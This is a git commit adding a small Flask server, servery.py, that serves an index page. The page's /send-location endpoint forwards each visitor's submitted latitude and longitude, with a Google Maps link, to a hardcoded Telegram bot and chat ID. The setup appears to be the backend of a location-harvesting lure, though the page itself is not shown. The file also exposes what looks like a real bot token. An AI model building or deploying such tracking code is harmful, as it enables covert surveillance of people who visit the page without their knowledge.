36e60e4c7ea59eec357fdac6ae072f5f642b760e
arab0009 <abu.taha9999999999@gmail.com>
2025-08-19 13:35:10 +0300

    Create servery.py

---
+++ servery.py
@@ -0,0 +1,29 @@
+from flask import Flask, request, send_from_directory
+import requests
+import os
+
+app = Flask(__name__, static_folder='.')
+
+# بيانات البوت
+BOT_TOKEN = "8332410324:AAEai9n4ojPBRHD6QT92IvQAhuiYzfXeMR4"
+CHAT_ID = "7744463904"
+
+@app.route('/')
+def index():
+    return send_from_directory('.', 'index.html')
+
+@app.route("/send-location", methods=["POST"])
+def send_location():
+    data = request.json
+    lat = data.get("latitude")
+    lon = data.get("longitude")
+    if lat and lon:
+        msg = f"📍 موقع جديد:\nخط العرض: {lat}\nخط الطول: {lon}\nhttps://www.google.com/maps?q={lat},{lon}"
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        requests.post(url, data={"chat_id": CHAT_ID, "text": msg})
+        return {"status": "ok"}
+    return {"status": "error"}, 400
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
